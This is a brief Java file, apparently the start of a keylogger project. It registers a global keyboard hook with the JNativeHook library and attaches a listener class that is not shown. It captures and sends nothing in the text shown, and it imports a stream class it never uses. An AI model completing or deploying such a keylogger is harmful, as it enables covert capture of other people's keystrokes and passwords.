package com.chaitanya1999;

import java.io.PipedOutputStream;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class KeyLogger {
    public static void main(String...args){
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new MyNativeKeyListener());
        } catch (Exception ex) {
            return;
        }
    }
}
